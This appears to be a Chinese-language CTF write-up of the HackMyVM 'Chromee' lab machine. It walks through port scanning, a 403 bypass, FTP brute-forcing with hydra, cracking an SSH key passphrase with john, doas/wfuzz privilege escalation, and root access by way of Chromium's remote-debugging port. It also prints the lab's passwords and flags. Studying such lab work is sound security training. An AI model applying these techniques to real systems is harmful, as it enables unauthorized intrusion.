---
layout: config.default_layout
title: HackMyVM-Chromee
date: 2025-04-15 17:31:46
updated: 2025-04-15 17:32:45
comments: true
tags: [HackMyVM,Linux靶机,图片隐写,Chromium]
categories: 靶机
---

# Chromee.

> https://hackmyvm.eu/machines/machine.php?vm=Chromee
> 

Note：**Have fun. :D**

## 前期踩点

```bash
➜  ~  nmap -sP 192.168.56.0/24                    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-14 11:05 EDT
Nmap scan report for 192.168.56.1
Host is up (0.00076s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00067s latency).
MAC Address: 08:00:27:00:4A:1E (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.43
Host is up (0.00049s latency).
MAC Address: 08:00:27:99:F9:89 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.4
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 15.09 seconds
```

```bash
➜  ~  nmap -sT -min-rate 10000 -p- 192.168.56.43  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-14 11:06 EDT
Nmap scan report for 192.168.56.43
Host is up (0.0015s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
8080/tcp  open  http-proxy
23333/tcp open  elxmgmt
MAC Address: 08:00:27:99:F9:89 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 10.50 seconds
```

`23333`端口扫出来是`vsftp` 

```bash
➜  ~  nmap -sT -A -T4 -O -p 22,80,8080,23333 192.168.56.43
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-14 11:07 EDT
Nmap scan report for 192.168.56.43
Host is up (0.00064s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp    open  http    nginx 1.18.0
|_http-title: primary
|_http-server-header: nginx/1.18.0
8080/tcp  open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.56 (Debian)
|_http-open-proxy: Proxy might be redirecting requests
23333/tcp open  ftp     vsftpd 3.0.3
MAC Address: 08:00:27:99:F9:89 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.64 ms 192.168.56.43

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.87 seconds
```

```bash
➜  ~ nmap -script=vuln 22,80,8080,23333 192.168.56.43    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-14 11:26 EDT
Failed to resolve "22,80,8080,23333".
Nmap scan report for 192.168.56.43
Host is up (0.00018s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  BID:49303  CVE:CVE-2011-3192
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://www.tenable.com/plugins/nessus/55976
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|       https://www.securityfocus.com/bid/49303
|_      https://seclists.org/fulldisclosure/2011/Aug/175
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
8080/tcp open  http-proxy
MAC Address: 08:00:27:99:F9:89 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 82.11 seconds
```

## vsftpd

扫描出了`vsftpd`，尝试是否允许匿名用户登录

```bash
➜  ~ ftp 192.168.56.43 -p 23333
Connected to 192.168.56.43.
220 (vsFTPd 3.0.3)
Name (192.168.56.43:root): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
```

不允许，先放着

## Web 渗透

存在 `80` 和 `8080` ，优先级 `80` > `8080`

### 80 端口

访问 `80` 端口

![image.png](image.png)

扫描一下目录

```bash
➜  Chromee gobuster dir -u http://192.168.56.43:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,zip                                                                          

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.43:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 4464]
/post.php             (Status: 200) [Size: 3]
/secret.php           (Status: 200) [Size: 549]
Progress: 1102800 / 1102805 (100.00%)
===============================================================
Finished
===============================================================
```

访问 `secret.php` 会将其下载下来

```bash
<!DOCTYPE html>
<html>
<head>
    <title>Secret</title>
</head>
<body>
    <?php
    $greeting = date('H') < 12 ? '早上好' : (date('H') < 18 ? '下午好' : '晚上好');
    $visitorIP = htmlspecialchars($_SERVER['REMOTE_ADDR']);

    echo "<h1>{$greeting}，adriana</h1>";
    echo "<p>当前时间：" . date('Y-m-d H:i:s') . "</p>";
    echo "<p>你的IP：{$visitorIP}</p>";
    if (isset($_GET['aaa'])) {
    	$file_content = file_get_contents('/opt/note/dic.txt');
    	echo $file_content;
	} else {
    		die();
	}
    ?>
</body>
</html>

```

有两个有趣的点，用户名：`adriana`；传输 `aaa` 参数的话会回显 `/opt/note/dic.txt` 的内容。

### 8080 端口

访问 `8080` 端口，提示：**You may need to bypass!**

![image.png](image1.png)

扫描目录

```bash
➜  Chromee gobuster dir -u http://192.168.56.43:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.43:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 33]
/.html                (Status: 403) [Size: 280]
/javascript           (Status: 301) [Size: 326] [--> http://192.168.56.43:8080/javascript/]
/silence              (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/server-status        (Status: 403) [Size: 280]
Progress: 1102800 / 1102805 (100.00%)
===============================================================
Finished
===============================================================
```

访问 `silence`

![image.png](image2.png)

根据提示尝试过绕过该限制

找到个工具：https://github.com/iamj0ker/bypass-403

```bash
➜  bypass-403 git:(main) ✗ ./bypass-403.sh http://192.168.56.43:8080/silence | grep 200
200,616  --> http://192.168.56.43:8080/silence/ -H Content-Length:0 -X POST
```

通过`POST`方法即可绕过

```bash
➜  bypass-403 git:(main) ✗ curl http://192.168.56.43:8080/silence/ -H Content-Length:0 -X POST                                                            
<!DOCTYPE html>
<html>
<head>
  <title>Silence</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin: 0;
      padding: 0;
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    h1 {
      font-size: 30px;
    }

    p {
      font-size: 18px;
      color: #888;
    }
  </style>
</head>
<body>
  <div class="container">
    <div>
      <h1>Silence</h1>
      <p>We are working to improve our website.</p>
      <p>contact: support@chromee.hmv</p>
    </div>
  </div>
</body>
</html>
```

发现域名 `chromee.hmv` 将其放到 `hosts` 文件

通过域名访问地址

![image.png](image3.png)

访问之前的`secret.php`

![image.png](image4.png)

添加参数 `aaa` ，以获得 `/opt/note/dic.txt` 文件内容

![image.png](image5.png)

```bash
The Lost Key Lily, a curious girl, found an old rusty key in the woods. Wondering where it belonged, she asked everyone in the village, but no one knew. One day, she discovered a locked stone well. To her surprise, the key fit. She opened it and descended into a hidden passage. There, she found an ancient chest filled with treasures. But the real treasure was a note inside: “The greatest treasure is the journey, not the prize.” Lily smiled, realizing the adventure was the real reward.
```

## FTP 爆破 & 信息收集

### 爆破

根据文件名应该是一个字典文件，并且也拿到了用户名`adriana` ，应该是要我们对哪里进行爆破，比如 `FTP`

现在对字典做处理

在尝试了使用`cewl` + `john` 生成的字典无果后，尝试使用`cupp` （根据人名生成字典）

```bash
➜  cupp git:(master) python cupp.py -i
 ___________ 
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]

[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: adriana
> Surname: Lily
> Nickname: 
> Birthdate (DDMMYYYY): 

> Partners) name: 
> Partners) nickname: 
> Partners) birthdate (DDMMYYYY): 

> Child's name: 
> Child's nickname: 
> Child's birthdate (DDMMYYYY): 

> Pet's name: 
> Company name: 
...
**[+] Now load your pistolero with adriana.txt** and shoot! Good luck!                                                                                                                                              
```

九头蛇爆破，得到密码 `Lily2020`

```bash
➜  Chromee hydra -l adriana -P cupp/adriana.txt -Vv -t 12 ftp://192.168.56.43:23333
[23333][ftp] host: 192.168.56.43   login: adriana   password: Lily2020
[STATUS] attack finished for 192.168.56.43 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-14 22:40:53
```

### 信息收集

使用`FTP`进行连接

- 可以找到有两个用户
    
    ```bash
    ftp> cd home
    250 Directory successfully changed.
    ftp> ls
    229 Entering Extended Passive Mode (|||64841|)
    150 Here comes the directory listing.
    drwxr-x---    4 1000     1000         4096 Mar 09 08:59 follower
    drwxr-x---    3 1001     1001         4096 Mar 07 13:39 softly
    ```
    
- `/srv` 下还能找到 `zeus.conf` 下载下来
    
    ```bash
    ftp> cd srv                                                                                             
    250 Directory successfully changed.                                                                     
    ftp> ls                                                                                                 
    229 Entering Extended Passive Mode (|||61786|)                                                          
    150 Here comes the directory listing. 
    drwxr-xr-x    2 0        115          4096 Mar 07 04:08 ftp           
    -rw-r--r--    1 0        0             153 Mar 09 09:20 zeus.conf                              
    ```
    
    ```
    ➜Chromee cat zeus.conf
    permit follower as softly cmd /usr/local/bin/wfuzz
    permit nopass :softly as root cmd /usr/bin/chromium
    permit nopass :softly as root cmd /usr/bin/kill
    ```
    
    1️⃣ `permit follower as softly cmd /usr/local/bin/wfuzz`
    
    → 允许用户 `follower`，以用户 `softly` 的身份运行 `/usr/local/bin/wfuzz`。
    
    2️⃣ `permit nopass :softly as root cmd /usr/bin/chromium`
    
    → 允许 `softly` 用户无密码，提权为 `root` 执行 `/usr/bin/chromium`。
    
    3️⃣ `permit nopass :softly as root cmd /usr/bin/kill`
    
    → 允许 `softly` 用户无密码，提权为 `root` 执行 `/usr/bin/kill`。
    
    那么我们应该是要先拿到`follower`用户
    
- `/opt/note` 下发现隐藏文件 `…`
    
    ```bash
    ftp> cd /opt/note
    250 Directory successfully changed.
    ftp> ls -al
    229 Entering Extended Passive Mode (|||59165|)
    150 Here comes the directory listing.
    drwxr-xr-x    2 106      115          4096 Mar 09 09:13 .
    drwxr-xr-x    4 0        0            4096 Mar 09 09:12 ..
    -rw-r--r--    1 0        0            3414 Mar 09 09:13 ...
    -rw-r--r--    1 0        0             495 Mar 07 15:40 dic.txt
    226 Directory send OK.
    ```
    
    是`SSH`私钥
    
    ```bash
    ➜  Chromee file '...'
    ...: OpenSSH private key
    ```
    
    因为我们是要先拿到 `follower`用户，所以私钥应该是`follower`用户的
    
    ```bash
    ➜  Chromee ssh follower@192.168.56.43 -i '...'
    Enter passphrase for key '...': 
    ```
    
    需要密码，进行爆破
    
    ```bash
    ➜  Chromee ssh2john '...' > sshkey     
                                 
    ➜  Chromee john --wordlist=/usr/share/wordlists/rockyou.txt sshkey               
    Using default input encoding: UTF-8
    Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
    Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
    Cost 2 (iteration count) is 24 for all loaded hashes
    Will run 16 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    cassandra        (...)     
    1g 0:00:00:25 DONE (2025-04-14 23:08) 0.03880g/s 39.73p/s 39.73c/s 39.73C/s johnson..cutie1
    Use the "--show" option to display all of the cracked passwords reliably
    ```
    
    得到密码`cassandra`
    
    ```bash
    ➜  Chromee ssh softly@192.168.56.43 -i '...'   
    softly@192.168.56.43: Permission denied (publickey).
    ```
    
    成功登陆
    
    ```bash
    ➜  Chromee ssh follower@192.168.56.43 -i '...'
    Enter passphrase for key '...': 
    follower@Chromee:~$ 
    ```
    

## 提权

### To softly

上面找到的，貌似是`doas`的配置文件，`dosa`可以以其他用户执行命令

```
➜Chromee cat zeus.conf
permit follower as softly cmd /usr/local/bin/wfuzz
permit nopass :softly as root cmd /usr/bin/chromium
permit nopass :softly as root cmd /usr/bin/kill
```

1️⃣ `permit follower as softly cmd /usr/local/bin/wfuzz`

→ 允许用户 `follower`，以用户 `softly` 的身份运行 `/usr/local/bin/wfuzz`。

2️⃣ `permit nopass :softly as root cmd /usr/bin/chromium`

→ 允许 `softly` 用户无密码，提权为 `root` 执行 `/usr/bin/chromium`。

3️⃣ `permit nopass :softly as root cmd /usr/bin/kill`

→ 允许 `softly` 用户无密码，提权为 `root` 执行 `/usr/bin/kill`。

允许`follower`，以用户 `softly` 的身份运行 `/usr/local/bin/wfuzz` 

尝试使用，输入`cassandra` 但是认证失败了，现在目标应该是`follower`的密码

```bash
follower@Chromee:~$ doas -u softly /usr/local/bin/wfuzz
Password: 
doas: authentication failed
```

家目录下能找到

```bash
follower@Chromee:~$ ls
cat.gif  note.txt
```

`note.txt`

```bash
follower@Chromee:~$ cat note.txt 
Think about rotations and the cat’s secrets.

47 is not just a number, it's a twist of fate.
```

旋转和猫？oiiaioiiiai ；47指的应该是 `rot47`

`cat.gif` 群主的修猫

![image.png](image6.png)

应该是图片隐写了

因为`gif`是多帧的，我们查看每一帧时间

```bash
➜  Chromee identify -format "%T " cat.gif
65 98 65 100 102 98 67 6 6 6 6 6 6 #   
```

前面的帧数很奇怪不像后面稳定的帧

提权前面的帧去进行`rot47`解密，得到密码`p3p573r`

![image.png](image7.png)

再次执行

```bash
follower@Chromee:~$ doas -u softly /usr/local/bin/wfuzz
Password: 
 /usr/local/lib/python3.9/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
*                                                      *
* Version up to 1.4c coded by:                         *
* Christian Martorella (cmartorella@edge-security.com) *
* Carlos del ojo (deepbit@gmail.com)                   *
*                                                      *
* Version 1.4d to 3.1.0 coded by:                      *
* Xavier Mendez (xmendez@edge-security.com)            *
********************************************************

Usage:  wfuzz [options] -z payload,params <url>

        FUZZ, ..., FUZnZ  wherever you put these keywords wfuzz will replace them with the values of the specified payload.
        FUZZ{baseline_value} FUZZ will be replaced by baseline_value. It will be the first request performed and could be used as a base for filtering.

Examples:
        wfuzz -c -z file,users.txt -z file,pass.txt --sc 200 http://www.site.com/log.asp?user=FUZZ&pass=FUZ2Z
        wfuzz -c -z range,1-10 --hc=BBB http://www.site.com/FUZZ{something not there}
        wfuzz --script=robots -z list,robots.txt http://www.webscantest.com/FUZZ

Type wfuzz -h for further information or --help for advanced usage.
```

尝试使用 `-w` 读取`softly`的私钥

```bash
follower@Chromee:~$ doas -u softly /usr/local/bin/wfuzz -u 127.0.0.1 -w /home/softly/.ssh/id_rsa
Password: 
 /usr/local/lib/python3.9/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 softly@Chromee:/home/follower$
```

却意外直接获得了`softly`用户的`shell`

### To root

在家目录可以看到 `user.txt`

```bash
softly@Chromee:~$ cat  user.txt
flag{c5dbe81aac6438c522d2f79cc7255e6a}
```

写入公钥，方便后面登录

```bash
echo "ssh-rsa xxxxxx" > .ssh/authorized_keys
```

通过前面我们能知道`softly`可以以`root`用户执行：

2️⃣ `permit nopass :softly as root cmd /usr/bin/chromium`

→ 允许 `softly` 用户无密码，提权为 `root` 执行 `/usr/bin/chromium`。

3️⃣ `permit nopass :softly as root cmd /usr/bin/kill`

→ 允许 `softly` 用户无密码，提权为 `root` 执行 `/usr/bin/kill`。

尝试运行`/usr/bin/chromium` 

```bash
softly@Chromee:~$ doas -u root /usr/bin/chromium --no-sandbox
[10526:10526:0415/095434.491167:ERROR:process_singleton_posix.cc(353)] The profile appears to be in use by another Chromium process (6169) on another computer (pepster). Chromium has locked the profile so that it doesn't get corrupted. If you are sure no other processes are using this profile, you can unlock the profile and relaunch Chromium.
[10526:10526:0415/095434.492377:ERROR:message_box_dialog.cc(146)] Unable to show a dialog outside the UI thread message loop: Chromium - The profile appears to be in use by another Chromium process (6169) on another computer (pepster). Chromium has locked the profile so that it doesn't get corrupted. If you are sure no other processes are using this profile, you can unlock the profile and relaunch Chromium.
```

可能是因为靶机上无`GUI`报的错，通过资料开启无头模式和远程调用

```bash
softly@Chromee:/$ doas /usr/bin/chromium --headless --remote-debugging-port=9222 --no-sandbox &

DevTools listening on ws://127.0.0.1:9222/devtools/browser/165f92a5-e162-4f6b-a283-2e4b4a875abf
[0415/103414.852554:WARNING:bluez_dbus_manager.cc(248)] Floss manager not present, cannot set Floss enable/disable.
[0415/103414.872625:ERROR:angle_platform_impl.cc(44)] Display.cpp:1052 (initialize): ANGLE Display::initialize error 12289: Could not open the default X display.
ERR: Display.cpp:1052 (initialize): ANGLE Display::initialize error 12289: Could not open the default X display.
[0415/103414.873142:ERROR:gl_display.cc(515)] EGL Driver message (Critical) eglInitialize: Could not open the default X display.
[0415/103414.874323:ERROR:gl_display.cc(786)] eglInitialize Default failed with error EGL_NOT_INITIALIZED
[0415/103414.874594:ERROR:gl_display.cc(820)] Initialization of all EGL display types failed.
[0415/103414.874732:ERROR:gl_ozone_egl.cc(26)] GLDisplayEGL::Initialize failed.
[0415/103414.875005:ERROR:angle_platform_impl.cc(44)] Display.cpp:1052 (initialize): ANGLE Display::initialize error 12289: Could not open the default X display.
ERR: Display.cpp:1052 (initialize): ANGLE Display::initialize error 12289: Could not open the default X display.
[0415/103414.875188:ERROR:gl_display.cc(515)] EGL Driver message (Critical) eglInitialize: Could not open the default X display.
[0415/103414.875244:ERROR:gl_display.cc(786)] eglInitialize Default failed with error EGL_NOT_INITIALIZED
[0415/103414.875360:ERROR:gl_display.cc(820)] Initialization of all EGL display types failed.
[0415/103414.875466:ERROR:gl_ozone_egl.cc(26)] GLDisplayEGL::Initialize failed.
[0415/103414.890126:ERROR:viz_main_impl.cc(196)] Exiting GPU process due to errors during initialization
```

在本地上启动了 `9222` 端口

```bash
softly@Chromee:~$ ss -tulpn
Netid    State     Recv-Q    Send-Q         Local Address:Port          Peer Address:Port    Process    
udp      UNCONN    0         0                    0.0.0.0:68                 0.0.0.0:*                  
tcp      LISTEN    0         10                 127.0.0.1:9222               0.0.0.0:*                  
tcp      LISTEN    0         511                  0.0.0.0:80                 0.0.0.0:*                  
tcp      LISTEN    0         128                  0.0.0.0:22                 0.0.0.0:*                  
tcp      LISTEN    0         32                         *:23333                    *:*                  
tcp      LISTEN    0         511                     [::]:80                    [::]:*                  
tcp      LISTEN    0         511                        *:8080                     *:*                  
tcp      LISTEN    0         128                     [::]:22                    [::]:* 
```

使用 `socat` 转发出去

```bash
softly@Chromee:~$ ./socat TCP-LISTEN:2222,fork tcp4:127.0.0.1:9222 &
```

使用 Chrome 进入调试页面 **`chrome://inspect/#devices`**

![image.png](image8.png)

点击 `configure`

![image.png](image9.png)

`Done` 之后会出现两个 `URL`

![image.png](image10.png)

点击第一个进行查看

![image.png](image11.png)

在调试页面可以看到会访问 `post.php` ,查看到载荷附带`key`值

![image.png](image12.png)

```bash
UGhhbnRvbSBFbmdhZ2UK
```

进行`base64`解码后是

![image.png](image13.png)

```bash
Phantom Engage : 幻影交战
```

尝试密码碰撞

最后使用未解码的 `UGhhbnRvbSBFbmdhZ2UK` 成功登录

```bash
softly@Chromee:~$ su root
Password: 
root@Chromee:/home/softly# 
```

读取 `root.txt`

```bash
root@Chromee:~# cat root.txt 
flag{e96f7a29ba633b4e43214b43d1791074}
```